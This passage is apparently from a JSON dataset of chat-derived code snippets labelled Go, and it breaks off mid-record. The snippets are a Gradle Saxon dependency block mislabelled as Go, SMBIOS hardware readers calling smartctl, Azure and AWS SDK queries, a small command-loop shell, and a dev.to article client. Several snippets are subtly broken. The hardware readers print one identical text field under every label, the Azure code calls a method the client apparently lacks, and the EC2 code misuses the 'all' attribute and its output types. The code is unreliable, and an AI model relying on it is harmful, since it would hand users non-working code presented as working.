    "code": "repositories {\n    maven {\n        url \"https://repo.maven.apache.org/maven2\"\n    }\n    maven {\n        url \"https://saxonica.jfrog.io/artifactory/ee-repo\"\n        credentials {\n            username = \"YOUR_USERNAME\"\n            password = \"YOUR_PASSWORD\"\n        }\n    }\n}\n\ndependencies {\n    implementation(group = \"net.sf.saxon\", name = \"Saxon-EE\", version = \"VERSION_NUMBER\")\n}",
    "filename": "747026f0b8c07f9861466300085d4200_0.go"
  },
  {
    "conversation_hash": "747026f0b8c07f9861466300085d4200",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "repositories {\n    flatDir {\n        dirs \"libs\"\n    }\n}\n\ndependencies {\n    implementation(name = \"saxon-ee\", ext = \"jar\")\n}",
    "filename": "747026f0b8c07f9861466300085d4200_1.go"
  },
  {
    "conversation_hash": "4959a474b9e8a2f749330691224eb38e",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\n\t\"github.com/digitalocean/go-smbios/smbios\"\n)\n\nfunc main() {\n\ts, err := smbios.NewSMBios()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfor _, t := range s.All() {\n\t\tswitch t.Type {\n\t\tcase 0:\n\t\t\tfmt.Println(\"BIOS Information:\")\n\t\t\tfmt.Println(\"Vendor:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Release Date:\", t.Text)\n\t\tcase 1:\n\t\t\tfmt.Println(\"System Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Product Name:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"UUID:\", t.Text)\n\t\t\tfmt.Println(\"Family:\", t.Text)\n\t\tcase 2:\n\t\t\tfmt.Println(\"Baseboard Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Product Name:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\tcase 3:\n\t\t\tfmt.Println(\"Chassis Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\tcase 4:\n\t\t\tfmt.Println(\"Processor Information:\")\n\t\t\tfmt.Println(\"Socket Designation:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Family:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"ID:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Voltage:\", t.Text)\n\t\t\tfmt.Println(\"External Clock:\", t.Text)\n\t\t\tfmt.Println(\"Max Speed:\", t.Text)\n\t\t\tfmt.Println(\"Current Speed:\", t.Text)\n\t\t\tfmt.Println(\"Status:\", t.Text)\n\t\t\tfmt.Println(\"Upgrade:\", t.Text)\n\t\t\tfmt.Println(\"L1 Cache Handle:\", t.Text)\n\t\t\tfmt.Println(\"L2 Cache Handle:\", t.Text)\n\t\t\tfmt.Println(\"L3 Cache Handle:\", t.Text)\n\t\tcase 5:\n\t\t\tfmt.Println(\"Memory Controller Information:\")\n\t\t\tfmt.Println(\"Error Detecting Method:\", t.Text)\n\t\t\tfmt.Println(\"Error Correcting Capabilities:\", t.Text)\n\t\t\tfmt.Println(\"Supported Interleave:\", t.Text)\n\t\t\tfmt.Println(\"Current Interleave:\", t.Text)\n\t\t\tfmt.Println(\"Max Memory Module Size:\", t.Text)\n\t\t\tfmt.Println(\"Supported Speeds:\", t.Text)\n\t\t\tfmt.Println(\"Supported Memory Types:\", t.Text)\n\t\tcase 17:\n\t\t\tfmt.Println(\"Memory Device Information:\")\n\t\t\tfmt.Println(\"Array Handle:\", t.Text)\n\t\t\tfmt.Println(\"Error Information Handle:\", t.Text)\n\t\t\tfmt.Println(\"Total Width:\", t.Text)\n\t\t\tfmt.Println(\"Data Width:\", t.Text)\n\t\t\tfmt.Println(\"Size:\", t.Text)\n\t\t\tfmt.Println(\"Form Factor:\", t.Text)\n\t\t\tfmt.Println(\"Set:\", t.Text)\n\t\t\tfmt.Println(\"Locator:\", t.Text)\n\t\t\tfmt.Println(\"Bank Locator:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Type Detail:\", t.Text)\n\t\t\tfmt.Println(\"Speed:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\t\tfmt.Println(\"Part Number:\", t.Text)\n\t\t\tfmt.Println(\"Attributes:\", t.Text)\n\t\tcase 22:\n\t\t\tfmt.Println(\"Portable Battery Information:\")\n\t\t\tfmt.Println(\"Location:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer Date:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Device Name:\", t.Text)\n\t\t\tfmt.Println(\"Device Chemistry:\", t.Text)\n\t\t\tfmt.Println(\"Designed Capacity:\", t.Text)\n\t\t\tfmt.Println(\"Full Charge Capacity:\", t.Text)\n\t\t\tfmt.Println(\"Device ID:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\tdefault:\n\t\t\t// Handle other types as needed\n\t\t}\n\t}\n}",
    "filename": "4959a474b9e8a2f749330691224eb38e_1.go"
  },
  {
    "conversation_hash": "4959a474b9e8a2f749330691224eb38e",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n\n\t\"github.com/digitalocean/go-smbios/smbios\"\n)\n\nfunc main() {\n\ts, err := smbios.NewSMBios()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfor _, t := range s.All() {\n\t\tswitch t.Type {\n\t\tcase 0:\n\t\t\tfmt.Println(\"BIOS Information:\")\n\t\t\tfmt.Println(\"Vendor:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Release Date:\", t.Text)\n\t\tcase 1:\n\t\t\tfmt.Println(\"System Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Product Name:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"UUID:\", t.Text)\n\t\t\tfmt.Println(\"Family:\", t.Text)\n\t\tcase 2:\n\t\t\tfmt.Println(\"Baseboard Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Product Name:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\tcase 3:\n\t\t\tfmt.Println(\"Chassis Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\tcase 4:\n\t\t\tfmt.Println(\"Processor Information:\")\n\t\t\tfmt.Println(\"Socket Designation:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Family:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"ID:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Voltage:\", t.Text)\n\t\t\tfmt.Println(\"External Clock:\", t.Text)\n\t\t\tfmt.Println(\"Max Speed:\", t.Text)\n\t\t\tfmt.Println(\"Current Speed:\", t.Text)\n\t\t\tfmt.Println(\"Status:\", t.Text)\n\t\t\tfmt.Println(\"Upgrade:\", t.Text)\n\t\t\tfmt.Println(\"L1 Cache Handle:\", t.Text)\n\t\t\tfmt.Println(\"L2 Cache Handle:\", t.Text)\n\t\t\tfmt.Println(\"L3 Cache Handle:\", t.Text)\n\t\tcase 5:\n\t\t\tfmt.Println(\"Memory Controller Information:\")\n\t\t\tfmt.Println(\"Error Detecting Method:\", t.Text)\n\t\t\tfmt.Println(\"Error Correcting Capabilities:\", t.Text)\n\t\t\tfmt.Println(\"Supported Interleave:\", t.Text)\n\t\t\tfmt.Println(\"Current Interleave:\", t.Text)\n\t\t\tfmt.Println(\"Max Memory Module Size:\", t.Text)\n\t\t\tfmt.Println(\"Supported Speeds:\", t.Text)\n\t\t\tfmt.Println(\"Supported Memory Types:\", t.Text)\n\t\tcase 17:\n\t\t\tfmt.Println(\"Memory Device Information:\")\n\t\t\tfmt.Println(\"Array Handle:\", t.Text)\n\t\t\tfmt.Println(\"Error Information Handle:\", t.Text)\n\t\t\tfmt.Println(\"Total Width:\", t.Text)\n\t\t\tfmt.Println(\"Data Width:\", t.Text)\n\t\t\tfmt.Println(\"Size:\", t.Text)\n\t\t\tfmt.Println(\"Form Factor:\", t.Text)\n\t\t\tfmt.Println(\"Set:\", t.Text)\n\t\t\tfmt.Println(\"Locator:\", t.Text)\n\t\t\tfmt.Println(\"Bank Locator:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Type Detail:\", t.Text)\n\t\t\tfmt.Println(\"Speed:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\t\tfmt.Println(\"Part Number:\", t.Text)\n\t\t\tfmt.Println(\"Attributes:\", t.Text)\n\t\tcase 22:\n\t\t\tfmt.Println(\"Portable Battery Information:\")\n\t\t\tfmt.Println(\"Location:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer Date:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Device Name:\", t.Text)\n\t\t\tfmt.Println(\"Device Chemistry:\", t.Text)\n\t\t\tfmt.Println(\"Designed Capacity:\", t.Text)\n\t\t\tfmt.Println(\"Full Charge Capacity:\", t.Text)\n\t\t\tfmt.Println(\"Device ID:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\tdefault:\n\t\t\t// Handle other types as needed\n\t\t}\n\t}\n\n\t// Dodatkowo wywołujemy smartctl -A /dev/nazwa_dysku\n\tdiskName := \"sda\" // Zmień na właściwą nazwę dysku\n\n\tout, err := exec.Command(\"smartctl\", \"-A\", \"/dev/\"+diskName).Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"\\nSMART Attributes:\")\n\tfmt.Println(string(out))\n}",
    "filename": "4959a474b9e8a2f749330691224eb38e_2.go"
  },
  {
    "conversation_hash": "4959a474b9e8a2f749330691224eb38e",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"flag\"\n\t\"fmt\"\n\t\"log\"\n\t\"os/exec\"\n\n\t\"github.com/digitalocean/go-smbios/smbios\"\n)\n\nfunc main() {\n\tbatteryFlag := flag.Bool(\"b\", false, \"Display Battery Information\")\n\tmemoryDeviceFlag := flag.Bool(\"md\", false, \"Display Memory Device Information\")\n\tmemoryControllerFlag := flag.Bool(\"mc\", false, \"Display Memory Controller Information\")\n\tcpuFlag := flag.Bool(\"cpu\", false, \"Display Processor Information\")\n\tchassisFlag := flag.Bool(\"c\", false, \"Display Chassis Information\")\n\tbaseboardFlag := flag.Bool(\"bi\", false, \"Display Baseboard Information\")\n\tsystemFlag := flag.Bool(\"si\", false, \"Display System Information\")\n\tbiosFlag := flag.Bool(\"bios\", false, \"Display BIOS Information\")\n\tdevFlag := flag.String(\"dev\", \"\", \"Specify device name for SMART Information\")\n\tflag.Parse()\n\n\ts, err := smbios.NewSMBios()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tif *batteryFlag {\n\t\tdisplayBatteryInformation(s)\n\t}\n\n\tif *memoryDeviceFlag {\n\t\tdisplayMemoryDeviceInformation(s)\n\t}\n\n\tif *memoryControllerFlag {\n\t\tdisplayMemoryControllerInformation(s)\n\t}\n\n\tif *cpuFlag {\n\t\tdisplayProcessorInformation(s)\n\t}\n\n\tif *chassisFlag {\n\t\tdisplayChassisInformation(s)\n\t}\n\n\tif *baseboardFlag {\n\t\tdisplayBaseboardInformation(s)\n\t}\n\n\tif *systemFlag {\n\t\tdisplaySystemInformation(s)\n\t}\n\n\tif *biosFlag {\n\t\tdisplayBiosInformation(s)\n\t}\n\n\tif *devFlag != \"\" {\n\t\tdisplaySmartInformation(*devFlag)\n\t}\n}\n\nfunc displayBatteryInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 22 {\n\t\t\tfmt.Println(\"Portable Battery Information:\")\n\t\t\tfmt.Println(\"Location:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer Date:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Device Name:\", t.Text)\n\t\t\tfmt.Println(\"Device Chemistry:\", t.Text)\n\t\t\tfmt.Println(\"Designed Capacity:\", t.Text)\n\t\t\tfmt.Println(\"Full Charge Capacity:\", t.Text)\n\t\t\tfmt.Println(\"Device ID:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displayMemoryDeviceInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 17 {\n\t\t\tfmt.Println(\"Memory Device Information:\")\n\t\t\tfmt.Println(\"Array Handle:\", t.Text)\n\t\t\tfmt.Println(\"Error Information Handle:\", t.Text)\n\t\t\tfmt.Println(\"Total Width:\", t.Text)\n\t\t\tfmt.Println(\"Data Width:\", t.Text)\n\t\t\tfmt.Println(\"Size:\", t.Text)\n\t\t\tfmt.Println(\"Form Factor:\", t.Text)\n\t\t\tfmt.Println(\"Set:\", t.Text)\n\t\t\tfmt.Println(\"Locator:\", t.Text)\n\t\t\tfmt.Println(\"Bank Locator:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Type Detail:\", t.Text)\n\t\t\tfmt.Println(\"Speed:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\t\tfmt.Println(\"Part Number:\", t.Text)\n\t\t\tfmt.Println(\"Attributes:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displayMemoryControllerInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 5 {\n\t\t\tfmt.Println(\"Memory Controller Information:\")\n\t\t\tfmt.Println(\"Error Detecting Method:\", t.Text)\n\t\t\tfmt.Println(\"Error Correcting Capabilities:\", t.Text)\n\t\t\tfmt.Println(\"Supported Interleave:\", t.Text)\n\t\t\tfmt.Println(\"Current Interleave:\", t.Text)\n\t\t\tfmt.Println(\"Max Memory Module Size:\", t.Text)\n\t\t\tfmt.Println(\"Supported Speeds:\", t.Text)\n\t\t\tfmt.Println(\"Supported Memory Types:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displayProcessorInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 4 {\n\t\t\tfmt.Println(\"Processor Information:\")\n\t\t\tfmt.Println(\"Socket Designation:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Family:\", t.Text)\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"ID:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Voltage:\", t.Text)\n\t\t\tfmt.Println(\"External Clock:\", t.Text)\n\t\t\tfmt.Println(\"Max Speed:\", t.Text)\n\t\t\tfmt.Println(\"Current Speed:\", t.Text)\n\t\t\tfmt.Println(\"Status:\", t.Text)\n\t\t\tfmt.Println(\"Upgrade:\", t.Text)\n\t\t\tfmt.Println(\"L1 Cache Handle:\", t.Text)\n\t\t\tfmt.Println(\"L2 Cache Handle:\", t.Text)\n\t\t\tfmt.Println(\"L3 Cache Handle:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displayChassisInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 3 {\n\t\t\tfmt.Println(\"Chassis Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Type:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displayBaseboardInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 2 {\n\t\t\tfmt.Println(\"Baseboard Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Product Name:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"Asset Tag:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displaySystemInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 1 {\n\t\t\tfmt.Println(\"System Information:\")\n\t\t\tfmt.Println(\"Manufacturer:\", t.Text)\n\t\t\tfmt.Println(\"Product Name:\", t.Text)\n\t\t\tfmt.Println(\"Serial Number:\", t.Text)\n\t\t\tfmt.Println(\"UUID:\", t.Text)\n\t\t\tfmt.Println(\"Family:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displayBiosInformation(s *smbios.SMBios) {\n\tfor _, t := range s.All() {\n\t\tif t.Type == 0 {\n\t\t\tfmt.Println(\"BIOS Information:\")\n\t\t\tfmt.Println(\"Vendor:\", t.Text)\n\t\t\tfmt.Println(\"Version:\", t.Text)\n\t\t\tfmt.Println(\"Release Date:\", t.Text)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc displaySmartInformation(deviceName string) {\n\tout, err := exec.Command(\"smartctl\", \"-A\", \"/dev/\"+deviceName).Output()\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tfmt.Println(\"SMART Information for /dev/\" + deviceName + \":\")\n\tfmt.Println(string(out))\n}",
    "filename": "4959a474b9e8a2f749330691224eb38e_3.go"
  },
  {
    "conversation_hash": "0720526769f39d29898526ce0afa57df",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n\n    \"github.com/Azure/azure-sdk-for-go/profiles/latest/resources/mgmt/resources\"\n    \"github.com/aws/aws-sdk-go/aws\"\n    \"github.com/aws/aws-sdk-go/aws/session\"\n    \"github.com/aws/aws-sdk-go/service/ec2\"\n)\n\nfunc main() {\n    // Pobierz informacje o parametrach chmury Azure\n    azureParams, err := getAzureCloudParams()\n    if err != nil {\n        fmt.Printf(\"Błąd pobierania informacji o parametrach chmury Azure: %v\", err)\n        return\n    }\n    fmt.Println(\"Informacje o parametrach chmury Azure:\")\n    fmt.Println(\"Nazwa chmury:\", azureParams.Name)\n    fmt.Println(\"Lokalizacja:\", azureParams.Location)\n    fmt.Println()\n\n    // Pobierz informacje o parametrach chmury AWS\n    awsParams, err := getAWSCloudParams()\n    if err != nil {\n        fmt.Printf(\"Błąd pobierania informacji o parametrach chmury AWS: %v\", err)\n        return\n    }\n    fmt.Println(\"Informacje o parametrach chmury AWS:\")\n    fmt.Println(\"Nazwa regionu:\", awsParams.Region)\n    fmt.Println(\"ID konta:\", awsParams.AccountID)\n}\n\nfunc getAzureCloudParams() (*resources.Subscription, error) {\n    // Inicjalizuj klienta do zarządzania zasobami Azure\n    azureResourceClient := resources.NewSubscriptionsClient(\"<AzureSubscriptionID>\")\n    authorizer, err := azureResourceClient.CreateAuthorizerFromEnvironment()\n    if err != nil {\n        return nil, err\n    }\n    azureResourceClient.Authorizer = authorizer\n\n    // Pobierz informacje o subskrypcji\n    subscription, err := azureResourceClient.Get(\"<AzureSubscriptionID>\")\n    if err != nil {\n        return nil, err\n    }\n\n    return &subscription, nil\n}\n\nfunc getAWSCloudParams() (*ec2.DescribeRegionsOutput, error) {\n    // Inicjalizuj nową sesję AWS\n    awsSession, err := session.NewSession(&aws.Config{\n        Region: aws.String(\"<AWSRegion>\"),\n    })\n    if err != nil {\n        return nil, err\n    }\n\n    // Inicjalizuj klienta EC2 AWS\n    awsEC2Client := ec2.New(awsSession)\n\n    // Pobierz informacje o regionach AWS\n    regions, err := awsEC2Client.DescribeRegions(&ec2.DescribeRegionsInput{})\n    if err != nil {\n        return nil, err\n    }\n\n    return regions, nil\n}",
    "filename": "0720526769f39d29898526ce0afa57df_0.go"
  },
  {
    "conversation_hash": "c68191a810e36fa4c4ad60bbbc4dab7f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/aws/aws-sdk-go/aws\"\n\t\"github.com/aws/aws-sdk-go/aws/session\"\n\t\"github.com/aws/aws-sdk-go/service/ec2\"\n)\n\nfunc main() {\n\t// Tworzenie nowej sesji AWS\n\tsess, err := session.NewSession(&aws.Config{\n\t\tRegion: aws.String(\"us-west-2\"), // Zmień na wybrany przez siebie region\n\t})\n\tif err != nil {\n\t\tfmt.Println(\"Błąd tworzenia sesji:\", err)\n\t\treturn\n\t}\n\n\t// Tworzenie nowego klienta EC2\n\tsvc := ec2.New(sess)\n\n\t// Pobieranie informacji o parametrach chmury AWS\n\tparams, err := svc.DescribeInstanceAttribute(&ec2.DescribeInstanceAttributeInput{\n\t\tAttribute:  aws.String(\"all\"),\n\t\tInstanceId: aws.String(\"INSTANCE_ID\"), // Zmień na ID instancji, dla której chcesz pobrać informacje\n\t})\n\tif err != nil {\n\t\tfmt.Println(\"Błąd pobierania informacji o parametrach instancji EC2:\", err)\n\t\treturn\n\t}\n\n\t// Wyświetlanie informacji o parametrach\n\tfmt.Println(\"Informacje o parametrach instancji EC2:\")\n\tfmt.Println(\"Instance ID:\", *params.InstanceId)\n\tfmt.Println(\"Kernel ID:\", *params.KernelId)\n\tfmt.Println(\"RAM disk ID:\", *params.RamdiskId)\n\n\t// Dodatkowo można wyświetlić inne dostępne informacje o parametrach\n\n}",
    "filename": "c68191a810e36fa4c4ad60bbbc4dab7f_0.go"
  },
  {
    "conversation_hash": "c68191a810e36fa4c4ad60bbbc4dab7f",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\n\t\"github.com/aws/aws-sdk-go/aws\"\n\t\"github.com/aws/aws-sdk-go/aws/session\"\n\t\"github.com/aws/aws-sdk-go/service/ec2\"\n)\n\nfunc main() {\n\t// Create a new AWS session\n\tsess, err := session.NewSession(&aws.Config{\n\t\tRegion: aws.String(\"us-west-2\"), // Change to your preferred region\n\t})\n\tif err != nil {\n\t\tfmt.Println(\"Error creating session:\", err)\n\t\treturn\n\t}\n\n\t// Create a new EC2 client\n\tsvc := ec2.New(sess)\n\n\t// Retrieve information about AWS cloud parameters\n\tparams, err := svc.DescribeAccountAttributes(&ec2.DescribeAccountAttributesInput{})\n\tif err != nil {\n\t\tfmt.Println(\"Error retrieving account attributes:\", err)\n\t\treturn\n\t}\n\n\t// Display information about parameters\n\tfmt.Println(\"AWS cloud parameters:\")\n\tfor _, param := range params.AccountAttributes {\n\t\tfmt.Println(\"Name:\", *param.AttributeName)\n\t\tfor _, value := range param.AttributeValues {\n\t\t\tfmt.Println(\"Value:\", *value.AttributeValue)\n\t\t}\n\t\tfmt.Println()\n\t}\n\n}",
    "filename": "c68191a810e36fa4c4ad60bbbc4dab7f_1.go"
  },
  {
    "conversation_hash": "226d2cea408b5eb8c12752425763c44f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\tfmt.Print(\"$ \")\n\t\tcmdString, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(os.Stderr, err)\n\t\t\treturn\n\t\t}\n\n\t\tcmdString = strings.TrimSuffix(cmdString, \"\\n\")\n\t\targs := strings.Split(cmdString, \" \")\n\n\t\tcmd := exec.Command(args[0], args[1:]...)\n\t\tcmd.Stdin = os.Stdin\n\t\tcmd.Stdout = os.Stdout\n\t\tcmd.Stderr = os.Stderr\n\n\t\terr = cmd.Run()\n\t\tif err != nil {\n\t\t\tfmt.Fprintln(os.Stderr, err)\n\t\t}\n\t}\n}",
    "filename": "226d2cea408b5eb8c12752425763c44f_0.go"
  },
  {
    "conversation_hash": "824caec0719cd932482ba5faa8e33cdc",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"os/exec\"\n\t\"strings\"\n)\n\nfunc main() {\n\tfor {\n\t\tfmt.Print(\"$ \")\n\t\treader := bufio.NewReader(os.Stdin)\n\t\tinput, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\n\t\tcommand := strings.TrimSuffix(input, \"\\n\")\n\n\t\targs := strings.Split(command, \" \")\n\t\tcmd := exec.Command(args[0], args[1:]...)\n\n\t\tcmd.Stdout = os.Stdout\n\t\tcmd.Stderr = os.Stderr\n\n\t\terr = cmd.Run()\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t}\n}",
    "filename": "824caec0719cd932482ba5faa8e33cdc_0.go"
  },
  {
    "conversation_hash": "0e778e30608e2d3456ca3c7b56700dde",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\ntype Article struct {\n\tID                   int    `json:\"id\"`\n\tTitle                string `json:\"title\"`\n\tDescription          string `json:\"description\"`\n}\n\nfunc main() {\n\tlogin := \"your_login\"\n\tapiKey := \"your_api_key\"\n\n\turl := \"https://dev.to/api/articles/me\"\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating request:\", err)\n\t\treturn\n\t}\n\n\treq.SetBasicAuth(login, apiKey)\n\n\tclient := &http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error sending request:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Error reading response body:\", err)\n\t\treturn\n\t}\n\n\tvar articles []Article\n\terr = json.Unmarshal(body, &articles)\n\tif err != nil {\n\t\tfmt.Println(\"Error unmarshaling response body:\", err)\n\t\treturn\n\t}\n\n\tfor _, article := range articles {\n\t\tfmt.Println(\"ID:\", article.ID)\n\t\tfmt.Println(\"Title:\", article.Title)\n\t\tfmt.Println(\"Description:\", article.Description)\n\t\tfmt.Println()\n\t}\n}",
    "filename": "0e778e30608e2d3456ca3c7b56700dde_0.go"
  },
  {
    "conversation_hash": "0e778e30608e2d3456ca3c7b56700dde",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\ntype Article struct {\n\tID          int    `json:\"id\"`\n\tTitle       string `json:\"title\"`\n\tDescription string `json:\"description\"`\n}\n\nfunc main() {\n\tlogin := \"your_login\"\n\tapiKey := \"your_api_key\"\n\n\turl := \"https://dev.to/api/articles/me\"\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating request:\", err)\n\t\treturn\n\t}\n\n\treq.SetBasicAuth(login, apiKey)\n\n\tclient := &http.Client{}\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error sending request:\", err)\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Error reading response body:\", err)\n\t\treturn\n\t}\n\n\tvar articles []Article\n\terr = json.Unmarshal(body, &articles)\n\tif err != nil {\n\t\tfmt.Println(\"Error unmarshaling response body:\", err)\n\t\treturn\n\t}\n\n\tfor _, article := range 